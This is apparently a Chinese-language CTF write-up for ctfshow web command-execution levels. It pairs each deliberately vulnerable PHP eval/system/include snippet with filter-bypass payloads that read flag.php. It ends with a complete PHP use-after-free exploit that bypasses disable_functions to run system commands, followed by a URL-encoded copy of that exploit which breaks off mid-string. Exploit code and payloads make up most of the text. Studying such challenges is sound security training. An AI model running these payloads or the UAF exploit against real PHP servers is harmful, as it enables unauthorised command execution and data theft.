# Web入门

**Web方向主打的就是一个经验积累。**

## 命令执行

**贴出的源代码均已去掉注释，太影响排版了**

### web29

命令执行，需要严格的过滤

贴上网站源代码

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

原理分析：获得一个名为”c“的GET请求，若这个请求中没有”flag“字样，则将这个GET请求当作一段PHP命令直接执行。

首先考虑扫一下目录，发现了一个flag.php可以直接访问，然而网站的过滤不允许。

先构建?c=phpinfo();调出了php介绍页面，发现PHP版本为7.3.11。同时服务器使用的是linux系统。这里没有找到flag。

先考虑使用system函数实现命令的执行，构造?c=system("ls");作为测试，发现成功了，网站给出可执行的文件分别为index.php和flag.php，其中默认显示的为index.php。

对于flag.php的访问，可以考虑使用f*，或者在linux系统下插入’‘，”“，\ ("\ "可能会被浏览器强行改为/，小心)来实现绕过。

接下来尝试使用?c=echo `tac f""lag.php`;成功得到flag

参考payload:?c=echo `tac f""lag.php`;

#### web29更好的解法

如果选择将flag.php内容先复制到另一个文件里，然后再直接访问这个文件，可以得到一个排版更好的内容。

参考payload:?c=echo `cp f* 1.txt`;然后直接访问1.txt即可。





### web30

命令执行，需要严格的过滤

本次flag、system和php被过滤了。

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

说明执行系统命令得使用其他的替代品，比如说echo ``，passthru等。

以**web29更好的解法**同样的原理，构造?c=echo `cp f* 1.txt`;然后直接访问1.txt即可得到flag

或者说，也可以?c=echo `tac f""lag.p""hp`;

不上图了，跟web29差不多。



### web31

这一次增加了cat,sort,shell,'.'和空格的过滤

**空格可以用tab代替，输入其URL编码%09，'.'同理**

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```

payload：?c=echo%09`tac%09f*`;

直接出答案，或者**复制后再访问**的思路也可以，但攻防的时候这样干确定不会被蓝队抓个正着吗？

同时如果复制的文件不写扩展名，需要下载下来用记事本查看。



### web32

很好，这次额外禁用了echo，内联和分号还有引号。看来**传统的命令执行是不行了**。

目前各位师傅的wp里面写的是文件包含，但用这个方法的话我要下一个专题有何用？

因此这里有一位师傅给出了回答：等后来学会了文件包含再来做这个。

payload：?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

这样可以利用伪协议得到flag.php的base64编码，前面的部分先闭合了上一个函数进行**逃逸**并将舞台留给伪协议。

```
<?php

error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web33

这次双引号被过滤了，还是得逃逸外加文件包含。

payload:?c=include%09$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php

payload:?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web34

放上源码

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

需要一个名称为“c”的GET请求，通过正则匹配的判断后即可执行命令

目前可用的执行函数有：passthru()

目前可用的读取函数有：tac, more, less, tail

空格和分号均被过滤了。

尝试逃逸加文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

成功，拿到flag。



### web35

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

同web34进行逃逸和文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



### web36

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

他这次把数字给禁用了

?c=include%09$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php



### web37

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

文件包含，由于过滤了flag，不能用php协议，所以用data://text/plain解决，绕开过滤用正则

?c=data://text/plain,<?php system("tac f*");?>

得到flag



### web38

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

增加了对php的过滤，然而没什么用

?c=data://text/plain,<?=system("tac f*");?>



### web39

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

收到一个名为c的GET请求，然后如果里面没有flag，那就给它后面加个.php包含它,其实如果结尾闭合了可以不管这个尾巴。

payload:

?c=data://text/plain,<?=system("tac%20f*");?>



### web40

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

搁这全武行呢？过滤了数字，~，`，@，#，$，%，^，&，*，()，-，=，+，{}，[]……

个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));

什么嘛，那是中文符号，吓我一跳。



### web41

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

POST请求，上bp

本题给出了一个脚本，可用于从ASCII中从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。

用那个脚本即可得到结果，与此同时，如果以后还有**没有过滤或运算**的命令执行时，均可以用它来生成可执行结果并跑出结果。

![](.\命令执行\web41.png)

脚本已同步于Github的script仓库中。



### web42

> 关于shell的重定向命令
>
> 标准输入，值为0，从磁盘获得输入
>
> 标准输出，值为1，输出到屏幕
>
> 错误输出，值为2，输出到屏幕
>
> 对应着/proc/self/fd/**x**，**x**为上面对应的值

现在看题，重点在于> /dev/null 2>&1

/dev/null为linux系统回收站，数据会被直接丢弃

2>&1则是将错误输出重定向到标准输出，如此一来便不会回显到显示器上。

所以采用命令把flag打印出来，利用；分隔分化一下命令，如此便能使其回显出来。

本题中输入?c=ls;ls，显示文件目录

?c=tac flag.php;ls，拿到flag



### web43

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次不许有分号，也不许有cat。tac不受影响，分号的分化分割作用可以用||代替。

payload:?c=tac flag.php ||



### web44

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

新增对flag的过滤，那就先正则匹配

payload:?c=tac f* ||



### web45

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次加了一个空格。空格可以用url编码的TAB代替，即%09

payload:?c=tac%09f*||



### web46

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次增加了对数字,$和*的过滤。

payload:?c=tac%09fla''g.php||



### web47

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

啊这……tac无所畏惧

payload:?c=tac%09fl''ag.php||



### web48

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

小老弟你怎么回事？

payload:?c=tac%09fl''ag.php||



### web49

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:?c=tac%09fl''ag.php||

这tac是犯了天条吗？几乎没见着过滤它的。



### web50

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次原先的payload终于没用了，好耶！

然后发现tac依旧坚挺，倒下的是%09，尝试使用%0C取代，不行，换<试试？行了

payload:?c=tac<fla''g.php||



### web51

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

无敌的tac倒下了，但是<没有倒下，||也没有倒下！

payload:?c=nl<fl''ag.php||

成功自行构造出官解，然而记得看源代码，这题没有回显。



### web52

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次<被过滤了。

        cat${IFS}flag.txt
        cat$IFS$9flag.txt
        cat<flag.txt
        cat<>flag.txt
        ca\t fl\ag
        kg=$ '\x20flag.txt' &&cat$kg
        (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
来来来，百科全书，上

payload：?c=nl$IFS/fl%27%27ag||

为什么不要php，没搞懂。



### web53

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

<br>空标签，意味着换行。也就是说会出现原指令的名字。

?c=ls查看发现有flag.php和readflag？

都尝试打开试试

?c=t''ac${IFS}fla''g.p''hp



### web54

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat 命令了。

空格依旧用${IFS}代替。先ls查看一下，发现目标文件flag.php

然后构建查看flag.php的payload：?c=/bin/?at${IFS}f???????

请注意，它只是执行了但没有回显结果，需要自己看源代码



### web55

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

但因为字母不能传入，我们需要使用通配符?来进行代替

?c=/bin/base64 flag.php

替换后变成

?c=/???/????64 ????.???

谜语人滚出CTF！

还真的得到了base64编码，但这种纯靠猜的题目建议扔秦岭喂大熊猫



### web56(未完成)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

它这次把数字也过滤了……





### web72

use the glob://

```
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```



uaf script:

```

c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) {

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10;
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");exit();
```



payload:

```
c=function%20ctfshow(%24cmd)%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3ea)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20(new%20exception)-%3egettrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5b1%5d%5b'args'%5d))%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr(%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord(%24str%5b%24p%2b%24j%5d)%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str(%24ptr%2c%20%24m%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20(%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf(%22%25c%22%2c(%24ptr%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write(%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf(%22%25c%22%2c(%24v%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak(%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write(%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10)%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen(%24helper-%3ea)%3b%20%20%20%20%20%20%20%20%20if(%24s%20!%3d%208)%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20(%24s%20*%208)%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf(%24base)%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak(%24base%2c%200x10%2c%202)%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak(%24base%2c%200x20)%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak(%24base%2c%200x36%2c%202)%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak(%24base%2c%200x38%2c%202)%3b%20%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak(%24header%2c%200%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak(%24header%2c%204%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak(%24header%2c%200x10)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak(%24header%2c%200x28)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%2